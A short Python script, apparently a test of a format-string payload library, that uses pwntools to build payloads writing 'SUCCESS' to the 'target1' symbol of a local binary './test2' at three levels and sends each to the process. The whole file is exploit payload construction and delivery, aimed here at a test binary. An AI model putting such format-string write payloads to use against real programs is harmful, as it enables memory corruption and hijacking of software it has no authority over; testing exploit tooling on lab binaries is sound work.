from one_fmt import *
from pwn import *

elf = ELF("./test2", checksec=False)

fmt = Fmt(6)
fmt[elf.symbols["target1"]] = "SUCCESS"

# LEVEL 0
payload = fmt.build(0)
print hexdump(payload)
r = process("./test2", level="error")

r.send(payload)
r.recvuntil("----------\n\n")
success("LEVEL 0 " + r.recvuntil("SUCCESS"))
r.close()

# LEVEL 1
payload = fmt.build(1)
print hexdump(payload)
r = process("./test2", level="error")

r.send(payload)
r.recvuntil("----------\n\n")
success("LEVEL 1 " + r.recvuntil("SUCCESS"))
r.close()

# LEVEL 2
fmt[elf.symbols["target1"]] = "SUCCESS"
payload = fmt.build(1)
print hexdump(payload)
r = process("./test2", level="error")

r.send(payload)
r.recvuntil("----------\n\n")
success("LEVEL 2 " + r.recvuntil("SUCCESS"))
r.close()
